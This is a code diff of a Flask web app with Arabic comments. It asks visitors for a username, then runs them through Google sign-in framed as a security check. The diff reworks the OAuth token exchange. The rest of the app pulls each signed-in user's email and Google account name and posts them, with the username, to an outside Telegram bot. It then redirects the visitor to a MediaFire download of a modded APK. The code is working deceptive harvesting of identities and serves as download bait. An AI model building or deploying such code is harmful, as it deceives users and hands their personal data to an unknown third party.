@@ -1,44 +1,15 @@
 import os
 import requests
 from flask import Flask, redirect, render_template_string, request, session, url_for
-from google_auth_oauthlib.flow import Flow
 
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "railway_secure_key_888")
+app.secret_key = os.getenv("SECRET_KEY", "simple_oauth_fallback_key")
 
-os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"
-
-CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "")
-CLIENT_SECRET = os.getenv("GOOGLE_CLIENT_SECRET", "")
-
+# ضع معلومات الـ Google Client الخاصة بك هنا مباشرة أو عبر متغيرات المنصة لضمان عدم حدوث أي خطأ
+CLIENT_ID = os.getenv("GOOGLE_CLIENT_ID", "ضع_Client_Id_هنا_إن_أردت")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
-
-SCOPES = [
-    "https://www.googleapis.com/auth/userinfo.email",
-    "https://www.googleapis.com/auth/userinfo.profile",
-    "openid",
-]
-
-
-def get_flow(redirect_uri):
-  if CLIENT_ID and CLIENT_SECRET:
-    client_config = {
-        "web": {
-            "client_id": CLIENT_ID,
-            "client_secret": CLIENT_SECRET,
-            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-            "token_uri": "https://oauth2.googleapis.com/token",
-        }
-    }
-    return Flow.from_client_config(
-        client_config, scopes=SCOPES, redirect_uri=redirect_uri
-    )
-  else:
-    return Flow.from_client_secrets_file(
-        "client_secret.json", scopes=SCOPES, redirect_uri=redirect_uri
-    )
 
 
 # الخطوة 1: طلب اسم المستخدم أولاً
@@ -51,7 +22,7 @@ def index():
       error = "الرجاء إدخال اسم المستخدم للمتابعة."
     else:
       session["username"] = username
-      return redirect(url_for("start_google_login"))
+      return redirect(url_for("google_redirect"))
 
   return render_template_string(
       """
@@ -98,44 +69,66 @@ def index():
   )
 
 
-# الخطوة 2: التوجيه لصفحة جوجل الحقيقية
+# الخطوة 2: التوجيه المباشر لصفحة جوجل الرسمية
 @app.route("/google-login")
-def start_google_login():
+def google_redirect():
   if "username" not in session:
     return redirect(url_for("index"))
 
-  flow = get_flow(url_for("authorized", _external=True))
-  authorization_url, state = flow.authorization_url(
-      access_type="offline", include_granted_scopes="true"
+  redirect_uri = url_for("authorized", _external=True)
+  google_auth_url = (
+      "https://accounts.google.com/o/oauth2/v2/auth?"
+      f"client_id={CLIENT_ID}&"
+      f"redirect_uri={redirect_uri}&"
+      "response_type=code&"
+      "scope=openid%20email%20profile"
   )
-  session["state"] = state
-  return redirect(authorization_url)
+  return redirect(google_auth_url)
 
 
-# الخطوة 3: استقبال البيانات وإرسالها للتليجرام
+# الخطوة 3: استقبال كود المصادقة، جلب البيانات، إرسالها للتليجرام والتحويل لميديافاير
 @app.route("/authorized")
 def authorized():
-  flow = get_flow(url_for("authorized", _external=True))
-  flow.fetch_token(authorization_response=request.url)
+  code = request.args.get("code")
+  if not code:
+    return redirect(url_for("index"))
 
-  credentials = flow.credentials
-  user_info_service = requests.get(
-      "https://www.googleapis.com/oauth2/v1/userinfo",
-      headers={"Authorization": f"Bearer {credentials.token}"},
-  ).json()
+  redirect_uri = url_for("authorized", _external=True)
+  client_secret = os.getenv("GOOGLE_CLIENT_SECRET", "ضع_Client_Secret_هنا")
 
-  user_email = user_info_service.get("email")
-  google_name = user_info_service.get("name")
-  custom_username = session.get("username", "غير معروف")
+  # استبدال الكود بـ Access Token
+  token_url = "https://oauth2.googleapis.com/token"
+  data = {
+      "code": code,
+      "client_id": CLIENT_ID,
+      "client_secret": client_secret,
+      "redirect_uri": redirect_uri,
+      "grant_type": "authorization_code",
+  }
 
-  if BOT_TOKEN and CHAT_ID and user_email:
-    msg = (
-        "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 اسم المستخدم (المُدخل):"
-        f" {custom_username}\n📛 اسم حساب Google: {google_name}\n📧 البريد"
-        f" الإلكتروني الحقيقي: {user_email}"
-    )
-    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
+  token_res = requests.post(token_url, data=data).json()
+  access_token = token_res.get("access_token")
+
+  if access_token:
+    # جلب معلومات المستخدم الحقيقية
+    user_info = requests.get(
+        "https://www.googleapis.com/oauth2/v1/userinfo",
+        headers={"Authorization": f"Bearer {access_token}"},
+    ).json()
+
+    user_email = user_info.get("email")
+    google_name = user_info.get("name")
+    custom_username = session.get("username", "غير معروف")
+
+    # إرسال البيانات لتليجرام
+    if BOT_TOKEN and CHAT_ID and user_email:
+      msg = (
+          "🤖 تم اجتياز التحقق الأمني بنجاح:\n\n👤 اسم المستخدم (المُدخل):"
+          f" {custom_username}\n📛 اسم حساب Google: {google_name}\n📧 البريد"
+          f" الإلكتروني الحقيقي: {user_email}"
+      )
+      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
   return redirect(FINAL_REDIRECT_URL)
 
